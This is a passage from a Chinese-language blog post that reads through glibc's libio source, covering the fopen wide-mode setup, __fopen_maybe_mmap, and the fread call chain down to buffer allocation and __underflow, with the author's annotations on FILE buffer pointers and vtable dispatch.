*/</span></span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line">  <span class="built_in">memset</span> (&amp;fp-&gt;_wide_data-&gt;_IO_last_state, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span> (<span class="type">__mbstate_t</span>));</span><br><span class="line"></span><br><span class="line">  cc = fp-&gt;_codecvt = &amp;fp-&gt;_wide_data-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step = fcts.towc;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_in.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__flags = __GCONV_IS_LAST;</span><br><span class="line">  cc-&gt;__cd_in.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step = fcts.tomb;</span><br><span class="line"></span><br><span class="line">  cc-&gt;__cd_out.step_data.__invocation_counter = <span class="number">0</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__internal_use = <span class="number">1</span>;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__flags = __GCONV_IS_LAST | __GCONV_TRANSLIT;</span><br><span class="line">  cc-&gt;__cd_out.step_data.__statep = &amp;result-&gt;_wide_data-&gt;_IO_state;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* From now on use the wide character callback functions.  */</span></span><br><span class="line">  _IO_JUMPS_FILE_plus (fp) = fp-&gt;_wide_data-&gt;_wide_vtable;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the mode now.  */</span></span><br><span class="line">  result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="0x6-fopen-maybe-mmap-函数"><a href="#0x6-fopen-maybe-mmap-函数" class="headerlink" title="0x6__fopen_maybe_mmap 函数"></a>0x6__fopen_maybe_mmap 函数</h3><p>针对 flags2 为 mmap 且 flags 设定为”r”的模式，可以直接使用 mmap 内容的方式，因为不需要修改原文件内容，所以需要替换 fp 中字符操作的虚函数表，使用 maybe_mmap 类型的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">33</span> FILE *</span><br><span class="line"><span class="number">34</span> __fopen_maybe_mmap (FILE *fp)</span><br><span class="line"><span class="number">35</span> &#123;</span><br><span class="line"><span class="number">36</span> <span class="meta">#<span class="keyword">if</span> _G_HAVE_MMAP</span></span><br><span class="line"><span class="number">37</span>   <span class="keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))</span><br><span class="line"><span class="number">38</span>     &#123;</span><br><span class="line"><span class="number">39</span>       <span class="comment">/* Since this is read-only, we might be able to mmap the contents</span></span><br><span class="line"><span class="comment">40      directly.  We delay the decision until the first read attempt by</span></span><br><span class="line"><span class="comment">41      giving it a jump table containing functions that choose mmap or</span></span><br><span class="line"><span class="comment">42      vanilla file operations and reset the jump table accordingly.  */</span></span><br><span class="line"><span class="number">43</span> </span><br><span class="line"><span class="number">44</span>       <span class="keyword">if</span> (fp-&gt;_mode &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="number">45</span>     _IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;</span><br><span class="line"><span class="number">46</span>       <span class="keyword">else</span></span><br><span class="line"><span class="number">47</span>     _IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;</span><br><span class="line"><span class="number">48</span>       fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;</span><br><span class="line"><span class="number">49</span>     &#125;</span><br><span class="line"><span class="number">50</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="number">51</span>   <span class="keyword">return</span> fp;</span><br><span class="line"><span class="number">52</span> &#125;</span><br></pre></td></tr></table></figure><hr><p>如果分配失败</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line"><span class="built_in">free</span> (new_f);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>取消链接并且free chunk返回NULL</p><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><p>描述fread读取文件流的主要流程以及函数对IO FILE结构体以及结构体中的vtable的操作</p><p>这篇文章则是说在创建了文件FILE以后，fread如何实现从文件中读取数据的。</p><p>参考下流程图:</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/t010fa5ddb8016fb9b2.png" alt=""></p><p>整体流程为<code>fread</code>调用<code>_IO_sgetn</code>，<code>_IO_sgetn</code>调用vtable中的<code>_IO_XSGETN</code>也就是<code>_IO_file_xsgetn</code>，<code>_IO_file_xsgetn</code>是<code>fread</code>实现的核心函数。它的流程简单总结为：</p><ol><li>判断<code>fp-&gt;_IO_buf_base</code>输入缓冲区是否为空，如果为空则调用的<code>_IO_doallocbuf</code>去初始化输入缓冲区。</li><li>在分配完输入缓冲区或输入缓冲区不为空的情况下，判断输入缓冲区是否存在数据。</li><li>如果输入缓冲区有数据则直接拷贝至用户缓冲区，如果没有或不够则调用<code>__underflow</code>函数执行系统调用读取数据到输入缓冲区，再拷贝到用户缓冲区。</li></ol><hr><p>fread实际上是<code>_IO_fread</code>函数，文件目录为<code>/libio/iofread.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);<span class="comment">//here</span></span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心是_IO_sgetn,在libio/gneops.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_IO_XSGETN是一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_XSGETN(FP,DATA,N) JUMP2 (__xsgetn, FP, DATA, N)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS, X1, X2)</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_JUMPS_FILE_plus(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">......       + offsetof(TYPE, MEMBER)))</span></span><br><span class="line">Expands to:</span><br><span class="line"></span><br><span class="line">((IO_validate_vtable ((*(__typeof__ (((<span class="keyword">struct</span> _IO_FILE_plus)&#123;&#125;).vtable) *)(((<span class="type">char</span> *) ((fp))) + __builtin_offsetof (<span class="keyword">struct</span> _IO_FILE_plus, vtable)))))-&gt;__xsgetn) (fp, data, n)</span><br></pre></td></tr></table></figure><p>实际上就是FILE结构体中vtable的<code>__xsgetn</code>函数，跟进去<code>/libio/fileops.c</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_file_xsgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> want, have;</span><br><span class="line">  <span class="type">ssize_t</span> count;</span><br><span class="line">  <span class="type">char</span> *s = data;</span><br><span class="line"></span><br><span class="line">  want = n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Maybe we already have a push back pointer.  */</span></span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_save_base != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span> (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;<span class="comment">// 第一部分，如果fp-&gt;_IO_buf_base为空的话则调用`_IO_doallocbuf`</span></span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (want &gt; <span class="number">0</span>)<span class="comment">//!!!注意这个循环++++++</span></span><br><span class="line">    &#123;</span><br><span class="line">      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;</span><br><span class="line">      <span class="keyword">if</span> (want &lt;= have)<span class="comment">// 第二部分，输入缓冲区里已经有足够的字符，则直接把缓冲区里的字符给目标buff</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);</span><br><span class="line">  fp-&gt;_IO_read_ptr += want;<span class="comment">//---从这一部分也可以看出,输入多余程序指定的内容,多余部分会被留在缓冲区中供下一次使用---</span></span><br><span class="line">  want = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (have &gt; <span class="number">0</span>)<span class="comment">// 第二部分，输入缓冲区里有部分字符，但是没有达到fread的size需求，先把已有的拷贝至目标buff</span></span><br><span class="line">    &#123;</span><br><span class="line">      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</span><br><span class="line">      want -= have;</span><br><span class="line">      fp-&gt;_IO_read_ptr += have;<span class="comment">//那么_IO_read_ptr==_IO_read_end</span></span><br><span class="line">    &#125;</span><br><span class="line">          <span class="comment">//可能有人会有疑惑,读入后s没有变化,那么每次读入不都是读入到同一个地方,会覆盖之前的吗</span></span><br><span class="line">          <span class="comment">//见注1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Check for backup and repeat */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If we now want less than a buffer, underflow and repeat</span></span><br><span class="line"><span class="comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span></span><br><span class="line"><span class="comment">     the user buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base</span><br><span class="line">      &amp;&amp; want &lt; (<span class="type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<span class="comment">//want小于buf承载极限</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (__underflow (fp) == EOF) <span class="comment">// 第三部分，输入缓冲区里不能满足需求，调用__underflow读入数据,当然这是在want&lt;buffer空间的情况下</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">continue</span>;<span class="comment">//返回ptr则continue</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">//循环真正的内容一般执行到这里就结束了</span></span><br><span class="line">        <span class="comment">//再往下的内容是buf分配失败情况下,直接调用sysread的代码</span></span><br><span class="line">---------------------------------------------------------------------------------</span><br><span class="line">  <span class="comment">/* These must be set before the sysread as we might longjmp out</span></span><br><span class="line"><span class="comment">     waiting for input. */</span></span><br><span class="line">  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line">  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Try to maintain alignment: read a whole number of blocks.  */</span></span><br><span class="line">  count = want;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (block_size &gt;= <span class="number">128</span>)</span><br><span class="line">count -= want % block_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  count = _IO_SYSREAD (fp, s, count);</span><br><span class="line">  <span class="keyword">if</span> (count &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count == <span class="number">0</span>)</span><br><span class="line">fp-&gt;_flags |= _IO_EOF_SEEN;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  s += count;</span><br><span class="line">  want -= count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)</span><br><span class="line">    _IO_pos_adjust (fp-&gt;_offset, count);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n - want;<span class="comment">//返回读入的长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>IO_file_xsgetn</code>是处理<code>fread</code>读入数据的核心函数，分为三个部分：</p><ul><li>第一部分是<code>fp-&gt;_IO_buf_base</code>为空的情况，表明此时的FILE结构体中的指针未被初始化，输入缓冲区未建立，则调用<code>_IO_doallocbuf</code>去初始化指针，建立输入缓冲区。</li><li>第二部分是输入缓冲区里有输入，即<code>fp-&gt;_IO_read_ptr</code>小于<code>fp-&gt;_IO_read_end</code>，此时将缓冲区里的数据直接拷贝至目标buff。</li><li>第三部分是输入缓冲区里的数据为空或者是不能满足全部的需求，则调用<code>__underflow</code>调用系统调用读入数据。</li></ul><p>接下来对<code>_IO_file_xsgetn</code>这三部分进行跟进并分析。</p><p>注<strong>1:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __mempcpy mempcpy</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mempcpy(D, S, N) ((void *) ((char *) memcpy (D, S, N) + (N)))</span></span><br></pre></td></tr></table></figure><p><strong>因此<code>s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);</code>语句会自动更新s的值</strong></p><h2 id="0x1-1"><a href="#0x1-1" class="headerlink" title="0x1"></a>0x1</h2><p><strong>初始化输入缓冲区</strong></p><p>在<code>fp-&gt;_IO_buf_base</code>为空时，也就是输入缓冲区未建立时，代码调用<code>_IO_doallocbuf</code>函数去建立输入缓冲区。跟进<code>_IO_doallocbuf</code>函数，看下它是如何初始化输入缓冲区，为输入缓冲区分配空间的，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_doallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base)<span class="comment">// 如何输入缓冲区不为空，直接返回</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="number">0</span>)<span class="comment">//检查标志位</span></span><br><span class="line">    <span class="keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<span class="comment">//调用vtable函数</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数先检查<code>fp-&gt;_IO_buf_base</code>是否为空，如果不为空的话表明该输入缓冲区已被初始化，直接返回。如果为空，则检查<code>fp-&gt;_flags</code>看它是不是<code>_IO_UNBUFFERED</code>或者<code>fp-&gt;_mode</code>大于0，如果满足条件调用FILE的vtable中的<code>_IO_file_doallocate</code>，跟进去该函数，在<code>/libio/filedoalloc.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_file_doallocate (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat64</span> <span class="title">st</span>;</span></span><br><span class="line"></span><br><span class="line">  size = BUFSIZ;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_fileno &gt;= <span class="number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="number">0</span>) &gt;= <span class="number">0</span>) <span class="comment">// 调用`_IO_SYSSTAT`获取FILE信息</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (S_ISCHR (st.st_mode))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Possibly a tty.  */</span></span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEV_TTY_P</span></span><br><span class="line">      DEV_TTY_P (&amp;st) ||</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      local_isatty (fp-&gt;_fileno))</span><br><span class="line">    fp-&gt;_flags |= _IO_LINE_BUF;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined _STATBUF_ST_BLKSIZE</span></span><br><span class="line">      <span class="keyword">if</span> (st.st_blksize &gt; <span class="number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)</span><br><span class="line">size = st.st_blksize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  p = <span class="built_in">malloc</span> (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (p == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  _IO_setb (fp, p, p + size, <span class="number">1</span>);<span class="comment">// 调用`_IO_setb`设置FILE缓冲区</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>_IO_file_doallocate</code>函数是分配输入缓冲区的实现函数，首先调用<code>_IO_SYSSTAT</code>去获取文件信息，<code>_IO_SYSSTAT</code>函数是vtable中的<code>__stat</code>函数，获取文件信息，<strong>修改相应需要申请的size。</strong></p><p>空间申请出来后，调用<code>_IO_setb</code>，跟进去看它干了些啥，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_setb (FILE *f, <span class="type">char</span> *b, <span class="type">char</span> *eb, <span class="type">int</span> a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (f-&gt;_IO_buf_base);</span><br><span class="line">  f-&gt;_IO_buf_base = b;</span><br><span class="line">  f-&gt;_IO_buf_end = eb;</span><br><span class="line">  <span class="keyword">if</span> (a)</span><br><span class="line">    f-&gt;_flags &amp;= ~_IO_USER_BUF;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    f-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数相对比较简单的就是设置了<code>_IO_buf_base</code>和<code>_IO_buf_end</code>，可以预料到<code>_IO_setb</code>函数执行完后，fp的这两个指针被赋上值了</p><p>到此，初始化缓冲区就完成了，函数返回<code>_IO_file_doallocate</code>后，接着<code>_IO_file_doallocate</code>也返回到<code>_IO_file_xsgetn</code>函数中.</p><h2 id="0x2-1"><a href="#0x2-1" class="headerlink" title="0x2"></a>0x2</h2><p><strong>拷贝输入缓冲区数据</strong></p><p>如果输入缓冲区里存在已输入的数据，则把它直接拷贝到目标缓冲区里。</p><p>这部分比较简单，<strong>需要说明下,<code>fp-&gt;_IO_read_base</code>指向的是输入缓冲区的起始地址，<code>fp-&gt;_IO_read_end</code>指向的是输入缓冲区的结束地址。<code>fp-&gt;_IO_read_ptr</code>指向还未读入的数据</strong></p><p>将<code>fp-&gt;_IO_read_end-fp-&gt;_IO_read_ptr</code>之间的数据通过<code>memcpy</code>拷贝到目标缓冲区里。</p><h2 id="0x3-1"><a href="#0x3-1" class="headerlink" title="0x3"></a>0x3</h2><p><strong>执行系统调用读取数据</strong></p><p>在输入缓冲区为0或者是不能满足需求的时候则会执行最后一步<code>__underflow</code>去执行系统调用<code>read</code>读取数据，并放入到输入缓冲区里。</p><p>进入到<code>__underflow</code>，文件在<code>/libio/genops.c</code>中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__underflow (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) == <span class="number">0</span> &amp;&amp; _IO_fwide (fp, <span class="number">-1</span>) != <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode == <span class="number">0</span>)</span><br><span class="line">    _IO_fwide (fp, <span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_put_mode (fp))</span><br><span class="line">    <span class="keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      _IO_switch_to_main_get_area (fp);</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)</span><br><span class="line"><span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">char</span> *) fp-&gt;_IO_read_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (_IO_have_markers (fp))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))</span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    